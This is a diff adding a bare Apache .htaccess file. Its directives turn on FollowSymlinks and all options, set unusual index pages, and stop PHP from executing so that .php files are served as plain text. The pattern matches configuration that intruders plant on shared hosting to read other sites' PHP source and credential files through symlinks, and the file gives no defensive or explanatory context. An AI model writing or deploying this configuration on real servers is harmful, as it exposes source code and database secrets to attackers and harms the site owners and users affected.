@@ -1,0 +1,7 @@
+ Options all 
+ DirectoryIndex Sux.html 
+ AddType text/plain .php 
+ AddHandler server-parsed .php 
+  Options +FollowSymlinks 
+ DirectoryIndex itti.html 
+ RemoveHandler .php
